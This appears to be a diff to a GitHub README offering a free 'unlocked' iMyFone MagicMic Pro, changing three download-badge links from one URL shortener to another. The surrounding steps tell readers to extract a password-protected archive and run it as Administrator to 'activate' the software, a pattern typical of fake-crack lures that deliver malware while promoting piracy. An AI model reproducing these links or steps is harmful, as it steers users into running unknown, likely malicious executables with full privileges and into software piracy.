@@ -9,7 +9,7 @@
 
 <div align="center">
 
-[![Download iMyFone MagicMic Pro](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/imyfone-magicmic-pro)
+[![Download iMyFone MagicMic Pro](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/MyXa3N8veBSk0TDSO)
 
 </div>
 
@@ -117,7 +117,7 @@
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Click "Activate" → Launch MagicMic
 
-[![Download iMyFone MagicMic Pro](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/imyfone-magicmic-pro)
+[![Download iMyFone MagicMic Pro](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/MyXa3N8veBSk0TDSO)
 
 ### Detailed Instructions (May 2026 Update)
 
@@ -262,7 +262,7 @@ Get full iMyFone MagicMic Pro features for free. **iMyFone MagicMic Pro** unlock
 
 <div align="center">
 
-[![Download iMyFone MagicMic Pro](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/imyfone-magicmic-pro)
+[![Download iMyFone MagicMic Pro](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/MyXa3N8veBSk0TDSO)
 
 **Version 4.6.1** — Free MagicMic pro unlock. May 2026 update. Zero cost. No payment.
 
